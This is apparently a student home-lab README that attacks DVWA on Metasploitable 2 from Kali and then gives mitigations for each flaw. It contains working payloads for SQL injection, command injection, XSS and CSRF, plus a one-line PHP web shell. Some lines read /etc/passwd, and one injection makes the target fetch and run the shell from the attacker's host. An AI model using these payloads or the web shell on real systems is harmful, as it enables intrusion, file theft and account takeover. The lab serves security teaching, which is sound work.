# HomeLab 3 — Web Exploitation (DVWA)

This lab demonstrates multiple web vulnerabilities using Damn Vulnerable Web Application (DVWA) hosted on Metasploitable 2. The goal is to understand how insecure input handling leads to authentication bypass, code execution, file disclosure, and unauthorized state changes. The attacker system is Kali Linux.

---

## Lab Environment

VM                 | Role      | IP Address
------------------ | --------- | -----------
Kali Linux         | Attacker  | 192.168.56.101
Metasploitable 2   | DVWA Host | 192.168.56.103

Network Mode: VirtualBox Host-Only  
DVWA Security Level: LOW  

---

## Objectives

- Perform brute force attacks with Burp Suite  
- Extract data using SQL Injection  
- Execute system commands using command injection  
- Demonstrate both reflected and stored XSS  
- Upload and execute a malicious PHP file (RCE)  
- Read system files using LFI  
- Execute remote malicious code using RFI  
- Perform forced state changes using CSRF  

---

## Step 1 — Brute Force (Burp Suite)

The DVWA login mechanism identifies users purely by checking username/password pairs without rate-limiting or lockout controls.

After intercepting the login request in Burp Suite, I marked the password parameter as the payload position.  
Rockyou.txt.gz caused performance issues inside the VM, so I used a smaller list containing 7 passwords.

The successful payload had a different response length, indicating the application redirected after a valid login. The correct password was “password”.

Explanation:  
DVWA does not implement account lockout, IP throttling, or delays between attempts. Any attacker can brute-force the login by monitoring response length, response time, or redirect behavior.

---

## Step 2 — SQL Injection

Input tested:

1' OR '1'='1

Explanation:  
DVWA concatenates the user input directly into the SQL statement:

SELECT first_name, last_name FROM users WHERE user_id = '$id';

Because the input contains additional SQL logic, the WHERE clause becomes permanently true, causing the database to return all users.

Risk impact:  
SQL injection enables attackers to retrieve, modify, or delete data, escalate privileges, or chain into RCE in certain database environments.

---

## Step 3 — Command Injection

Payloads tested:

8.8.8.8; whoami  
8.8.8.8 | uname -a  
8.8.8.8 | pwd

Explanation:  
The app runs:

ping -c 4 <user_input>

Because characters like “;” and “|” terminate the ping command, anything after them runs as a separate shell command.

Risk impact:  
Command injection gives full OS-level access under the web server user account (www-data). Attackers can read files, download malware, pivot further, or escalate privileges.

---

## Step 4 — Reflected XSS

Payload:

<script>alert('XSS')</script>

Explanation:  
The application reflects user-controlled data back into the HTML response without escaping or HTML encoding. The browser interprets the script tag and executes JavaScript.

Real-world impact:  
Reflected XSS enables token theft, session hijacking, phishing, and user impersonation.

---

## Step 5 — Stored XSS

Payload stored into the guestbook field:

<script>alert('Stored XSS')</script>

Explanation:  
The script became part of the database entry and executed every time the page was viewed. Because stored XSS persists, it is more dangerous than reflected XSS.

Impact:  
Stored XSS can hit all users, including administrators. Attackers can steal session cookies, modify application behavior, inject keyloggers, or spread worms across user accounts.

---

## Step 6 — File Upload (Web Shell → RCE)

Uploaded file:

<?php system($_GET['cmd']); ?>

Explanation:  
DVWA fails to validate MIME type, content, file extension, or block PHP execution inside the uploads directory. The server executes the file as PHP, and attackers control the “cmd” parameter.

Commands executed:

shell.php?cmd=whoami  
shell.php?cmd=id  
shell.php?cmd=cat /etc/passwd

Impact:  
This is direct remote code execution. From here, attackers can pivot, escalate privileges, access sensitive files, or create persistent backdoors.

---

## Step 7 — Local File Inclusion (LFI)

Payload:

../../../../../etc/passwd

Explanation:  
DVWA includes the user-supplied page parameter directly:

include($_GET['page']);

By traversing out of the DVWA directory and reaching the filesystem root, I accessed /etc/passwd. Additional “../” segments are safely ignored by Linux path resolution, so over-traversal does not break the attack.

Impact:  
LFI can reveal sensitive files, API keys, credentials, and in some cases escalate to RCE through log poisoning or PHP session file injection.

---

## Step 8 — Remote File Inclusion (RFI)

RFI failed initially due to the PHP configuration:

allow_url_include = Off

Explanation:  
When Off, PHP refuses to execute remotely hosted files for security.  
After enabling allow_url_include and restarting Apache, RFI became possible.

I hosted shell.php on Kali and injected:

?page=http://192.168.56.101:8000/shell.php&cmd=id

Explanation:  
DVWA fetched the attacker’s malicious PHP file and executed it as local code, giving full remote command execution.

Impact:  
RFI is one of the most dangerous vulnerabilities because attackers can execute arbitrary code from anywhere on the internet.

---

## Step 9 — CSRF (Cross-Site Request Forgery)

Built malicious attacker site:

<form action="http://192.168.56.103/dvwa/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="pwned123">
  <input type="hidden" name="password_conf" value="pwned123">
  <input type="hidden" name="Change" value="Change">
</form>

Explanation:  
DVWA’s password-change function does not verify that the request came from DVWA itself. There is no CSRF token, no Origin checking, and no Referer validation.

Impact:  
A logged-in user can be forced to change their password, modify settings, or perform other state-changing actions without noticing.

---

## Vulnerability Summary

- Brute Force: No rate limiting or authentication controls  
- SQL Injection: Raw concatenation of user input into SQL queries  
- Command Injection: Direct shell execution without sanitization  
- Reflected XSS: Unescaped user input rendered in HTML  
- Stored XSS: Script stored in database and executed on every view  
- File Upload RCE: No validation or execution restrictions on uploaded files  
- LFI: Direct user control over include() paths  
- RFI: Arbitrary remote PHP execution after allow_url_include was enabled  
- CSRF: No tokens, no origin verification, and GET-based password changes  

---

## Mitigations

Below are the realistic mitigations for each vulnerability.

### Brute Force
- Add account lockouts or temporary timeouts after repeated failures.
- Use rate limiting based on IP and login attempts.
- Add MFA so password guessing alone is not enough.
- Use uniform response sizes and timing to prevent side-channel detection.

### SQL Injection
- Never concatenate user input directly into SQL queries.
- Use prepared statements (parameterized queries) everywhere.
- Enforce strict input validation and type checking.
- Disable detailed SQL error output in production.

### Command Injection
- Do not pass raw user input into system() or shell commands.
- Use safe system APIs, not shell execution.
- Validate input strictly (only allow expected characters).
- Drop privileges for web services so even if compromised, impact is limited.

### Reflected XSS
- Escape all user-controlled output before rendering (HTML encode, JS encode).
- Use templating engines that automatically escape output.
- Add Content Security Policy (CSP) to restrict inline scripts.

### Stored XSS
- Sanitize input before storing it and escape it before displaying it.
- Block script tags and dangerous HTML.
- Use HTTP-only cookies so even if XSS occurs, cookies are less exposed.
- Avoid storing raw user HTML in any database without sanitization.

### File Upload (Web Shell / RCE)
- Restrict allowed file types using MIME type checks and magic number checks.
- Never allow executable files inside publicly reachable directories.
- Rename uploads to random UUIDs and store them outside the web root.
- Disable execution on upload directories using server configuration.

### Local File Inclusion (LFI)
- Do not pass user input directly to include(), require(), or file reads.
- Whitelist allowed file paths instead of allowing arbitrary paths.
- Use realpath() and check if the resolved path stays inside the allowed directory.
- Disable error messages that leak filesystem paths.

### Remote File Inclusion (RFI)
- Keep allow_url_include and allow_url_fopen disabled.
- Do not dynamically include remote files based on user input.
- Enforce a whitelist of server-side templates if includes are required.
- Never run PHP code from external sources.

### CSRF
- Add anti-CSRF tokens to every state-changing request.
- Require POST instead of GET for actions that modify data.
- Validate Origin and Referer headers.
- Use SameSite=Lax or SameSite=Strict cookies to prevent cross-site requests.

---

## Defensive Summary

Overall, every issue in this lab comes from the same root problem: the application trusts user input too much and handles it without validation. Most of the vulnerabilities disappear as soon as the server stops taking raw input and stops executing it directly.

In practice, the defensive strategy is simple:

1. Validate everything.  
   Never assume user input is safe. Sanitize and filter it before using it anywhere.

2. Do not echo user input without escaping it.  
   This blocks most XSS issues before they happen.

3. Never build SQL or shell commands by string concatenation.  
   Use prepared statements for SQL and avoid system() entirely.

4. Treat file uploads as dangerous by default.  
   Enforce strict allowlists and prevent execution inside upload folders.

5. Remove risky PHP settings.  
   Features like allow_url_include should always stay off.

6. Add CSRF protections everywhere.  
   Any state-changing action must require a valid CSRF token.

7. Limit exposure even if something breaks.  
   Use least-privilege accounts, disable detailed error messages, and avoid leaking filesystem paths or stack traces.

When these basic principles are in place, most of the attacks from this lab become much harder or impossible. The point of DVWA is to show how quickly everything falls apart when those protections are missing. In a real environment, a secure baseline and consistent validation practices are enough to stop all of these issues before they happen

---

## Files Included in This Lab

```text
/lab3/
├── README.md
├── DVWA_Web_Exploitation.pdf
├── shell.php
├── csrf_attack.html
└── Screenshots/
    ├──Brute_force.png
    ├──Burp_Post_request.png
             .
             .
             .
    ├──XSS_Stored_alert_after_submission.png
    ├──XSS_Stored_reentering.png
    └──XSS_Stored_refresh.png


